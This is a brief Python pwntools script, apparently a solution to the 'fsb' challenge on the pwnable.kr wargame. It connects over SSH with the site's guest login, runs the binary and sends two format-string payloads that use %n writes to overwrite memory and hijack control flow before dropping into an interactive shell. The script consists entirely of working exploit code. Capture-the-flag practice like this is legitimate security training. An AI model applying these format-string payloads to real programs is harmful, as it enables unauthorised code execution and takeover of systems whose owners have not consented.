from pwn import *

ssh_pwn = ssh(host='pwnable.kr',user='fsb',password='guest',port=2222)
p = ssh_pwn.process(['./fsb'])
p.sendline('%0{0}x%14$n'.format(0x804a000))
p.sendline('%0{0}x%20$n'.format(0x80486ab))
p.interactive()